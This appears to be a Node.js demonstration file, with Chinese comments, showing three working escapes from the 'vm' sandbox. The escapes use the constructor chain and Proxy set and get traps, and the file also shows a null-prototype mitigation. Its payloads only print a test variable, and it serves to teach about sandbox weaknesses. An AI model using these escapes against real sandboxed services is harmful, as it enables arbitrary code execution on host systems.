const vm = require('vm')

// sauce 是主进程变量
sauce = 'laser' // 'laser is the sauce'
// [https://www.theregister.co.uk/2018/02/08/waymo_uber_trial/]
// 1. 利用原型链中 Function 执行作用域为 global 实现沙箱逃逸，访问到了主进程变量
const code2 = '(this.constructor.constructor("return sauce"))()'
console.log('原型链逃逸', vm.runInContext(code2, vm.createContext({}))) // -> laser

// 通过赋值上下文原型链为 null 避免此问题
try {
  console.log(vm.runInContext(code2, vm.createContext(Object.create(null))))
} catch (e) {
  // 会抛出错误
  console.log('error:', e.message)
}

// 2. 代理设置注入，获取了函数引用，从而访问到全局
const code3 = `new Proxy({}, {
  set: function(me, key, value) { (value.constructor.constructor('console.log("proxy set 逃逸",sauce)'))() }
})`
data = vm.runInContext(code3, vm.createContext(Object.create(null)))
// 这行代码会执行 setter 代理函数，
// 并且会打印出 'laser'，即使没有直接的 console.log 语句。
data.some_key = {}

/// 3. 代理读取注入
const code4 = `new Proxy({}, {
  get: function(me, key) { (arguments.callee.caller.constructor('console.log("proxy get 逃逸", sauce)'))() }
})`
data = vm.runInContext(code4, vm.createContext(Object.create(null)))
// 下面这行代码会执行 getter 代理函数，
// 并且会打印出 'laser'，即使没有直接的 console.log 语句。
data.some_key
